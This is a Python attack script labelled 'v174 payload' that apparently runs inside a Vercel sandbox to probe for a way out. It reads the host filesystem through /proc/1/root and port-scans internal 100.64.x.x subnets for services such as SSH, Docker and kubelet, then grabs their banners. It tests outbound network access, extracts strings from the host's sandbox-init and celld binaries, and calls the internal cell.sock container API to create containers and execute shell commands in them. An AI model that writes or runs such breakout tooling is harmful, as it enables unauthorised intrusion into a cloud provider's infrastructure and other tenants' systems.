# -*- coding: utf-8 -*-
"""v174 payload: 修复 SO_ERROR 扫描 + 出网细分 + init.sock 字符串提取 + Exec 变体 + Mount 校验
输出 /vercel/sandbox/v174c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess, select as sel

OUT = '/vercel/sandbox/v174c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


def str_extract(path, kws, max_size=400 * 1024 * 1024, max_hits=30, ctx=150):
    """提取二进制中关键词附近的全部可打印字符串"""
    try:
        size = os.path.getsize(path)
        log('STR %s size=%d' % (path, size))
        if size > max_size:
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                e = min(len(data), m.end() + ctx)
                seg = data[s:e]
                # 只保留可打印段
                out = []
                cur = []
                for c in seg:
                    if 32 <= c < 127 or c in (9, 10, 13):
                        cur.append(chr(c))
                    else:
                        if len(cur) >= 4:
                            out.append(''.join(cur))
                        cur = []
                if len(cur) >= 4:
                    out.append(''.join(cur))
                joined = ' || '.join(out)
                if joined:
                    log('STR %s @0x%x: %s' % (kw, m.start(), joined[:600]))
                    hits += 1
                if hits >= max_hits:
                    break
        log('STR done hits=%d' % hits)
    except Exception as e:
        log('STR EXC %s' % e)


# ============ 1: 网络基础 ============
log('=== 1 net ===')
myip = None
gw = None
try:
    for ln in open('/proc/1/net/route').read().splitlines()[1:]:
        p = ln.split()
        if p[1] == '00000000':
            gw = socket.inet_ntoa(struct.pack('<I', int(p[2], 16)))
    log('GW=%s' % gw)
except Exception as e:
    log('GW EXC %s' % e)
try:
    fib = open('/proc/1/net/fib_trie').read()
    for mm in re.finditer(r'\|-- (100\.64\.\d+\.\d+)\n\s+/32 host LOCAL', fib):
        myip = mm.group(1)
        log('MYIP=%s' % myip)
        break
except Exception as e:
    log('MYIP EXC %s' % e)
try:
    log('ARP: %s' % open('/proc/net/arp').read()[:1500])
except Exception as e:
    log('ARP EXC %s' % e)
try:
    log('DNS conf: %s' % open('/etc/resolv.conf').read()[:300])
except Exception as e:
    log('DNS EXC %s' % e)

# ============ 2: 出网细分 ============
log('=== 2 egress ===')
# UDP DNS 测试
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01', ('8.8.8.8', 53))
    d, a = s.recvfrom(512)
    log('UDP8.8.8.8:53 -> %d bytes from %s' % (len(d), a))
    s.close()
except Exception as e:
    log('UDP8.8.8.8:53 EXC %s' % e)
# 本机网关 DNS?
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01', ('100.64.0.1', 53))
    d, a = s.recvfrom(512)
    log('UDP100.64.0.1:53 -> %d bytes' % len(d))
    s.close()
except Exception as e:
    log('UDP100.64.0.1:53 EXC %s' % e)
# 外部 TCP
for ip, p in [('1.1.1.1', 443), ('8.8.8.8', 53), ('1.1.1.1', 80), ('93.184.215.14', 80)]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        r = s.connect_ex((ip, p))
        log('TCP %s:%d -> rc=%d' % (ip, p, r))
        s.close()
    except Exception as e:
        log('TCP %s:%d EXC %s' % (ip, p, e))

# ============ 3: SO_ERROR 修复扫描 ============
log('=== 3 scan ===')
my24 = ''
if myip:
    parts = myip.split('.')
    my24 = '%s.%s.%s.' % (parts[0], parts[1], parts[2])
nets = [my24, '100.64.0.', '100.64.1.', '100.64.64.', '100.64.255.', '100.64.128.', '100.64.192.']
ports = [22, 80, 443, 8080, 3000, 5000, 2375, 53, 8443, 9090, 10250]
targets = []
for net in nets:
    if not net:
        continue
    for i in range(1, 255):
        ip = net + str(i)
        for p in ports:
            targets.append((ip, p))


def async_scan(targets, timeout=0.7, batch=500):
    hits = []
    for b in range(0, len(targets), batch):
        chunk = targets[b:b + batch]
        socks = []
        for ip, p in chunk:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((ip, p))
                socks.append((s, ip, p))
            except Exception:
                pass
        t0 = time.time()
        while socks and time.time() - t0 < timeout:
            try:
                r, w, x = sel.select([], [s for s, _, _ in socks], [], 0.05)
                for s in w:
                    idx = next(i for i, (ss, _, _) in enumerate(socks) if ss == s)
                    ss, ip, p = socks.pop(idx)
                    try:
                        err = ss.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                        if err == 0:
                            hits.append((ip, p))
                            log('NET HIT %s:%d' % (ip, p))
                    except Exception:
                        pass
                    ss.close()
            except Exception:
                break
        for s, ip, p in socks:
            try:
                s.close()
            except Exception:
                pass
    return hits


t0 = time.time()
hits = async_scan(targets, timeout=0.7, batch=500)
log('scan done %d targets %d hits took=%.0fs' % (len(targets), len(hits), time.time() - t0))

# ============ 4: 命中 banner ============
for ip, p in hits[:20]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, p))
        if p in (80, 8080, 3000, 5000, 8443):
            s.sendall(b'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
        d = b''
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                d += c
                if len(d) > 1500:
                    break
        except Exception:
            pass
        s.close()
        log('BANNER %s:%d -> %r' % (ip, p, d[:600]))
    except Exception as e:
        log('BANNER %s:%d EXC %s' % (ip, p, e))

# ============ 5: init.sock 字符串提取 ============
log('=== 5 sbi strings ===')
SBI = '/proc/1/root/volumes/run/vercel/share/sandbox-init'
str_extract(SBI, [rb'init\.sock', rb'HandleFunc', rb'http\.Handler', rb'serveMux',
                  rb'/v1/', rb'sandbox-init', rb'listen'], max_hits=25, ctx=150)

# ============ 6: Exec 变体 ============
log('=== 6 exec var ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    time.sleep(1)
    fp = find_proc(['yes'])
    log('yes pid=%s' % (fp[0] if fp else None))
    # 变体 1: 完整 Process (directory + environment)
    procs = [
        {'command': '/bin/sh', 'arguments': ['-c', 'touch /tmp/p1ok'], 'directory': '/'},
        {'command': 'sh', 'arguments': ['-c', 'touch /tmp/p2ok'], 'environment': ['PATH=/bin:/usr/bin']},
        {'command': '/bin/echo', 'arguments': ['hello']},
    ]
    for i, proc in enumerate(procs):
        body = json.dumps({'container_id': cid, 'process': proc}).encode()
        st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=5)
        log('Exec%d %s -> %s %r' % (i, proc.get('command'), st3, pay3[:180]))
    time.sleep(1)
    # 检查容器视角是否有文件 (通过 /proc/<pid>/root)
    if fp:
        pid = fp[0]
        for pp in ['/proc/%s/root/tmp/p1ok' % pid, '/proc/%s/root/tmp/p2ok' % pid]:
            try:
                log('CHECK %s exists=%s' % (pp, os.path.exists(pp)))
            except Exception as e:
                log('CHECK EXC %s' % e)

# ============ 7: Mount 校验逻辑 ============
log('=== 7 mount val ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    for kw in [b'invalid destination', b'invalid path', b'mount mode unspecified']:
        for mm in re.finditer(re.escape(kw), data):
            s = max(0, mm.start() - 700)
            seg = data[s:mm.end() + 400]
            out = []
            cur = []
            for c in seg:
                if 32 <= c < 127 or c in (9, 10, 13):
                    cur.append(chr(c))
                else:
                    if len(cur) >= 4:
                        out.append(''.join(cur))
                    cur = []
            if len(cur) >= 4:
                out.append(''.join(cur))
            log('MV %s @0x%x: %s' % (kw, mm.start(), ' || '.join(out)[:800]))
            break
except Exception as e:
    log('MV EXC %s' % e)

log('V174_DONE')
f.close()
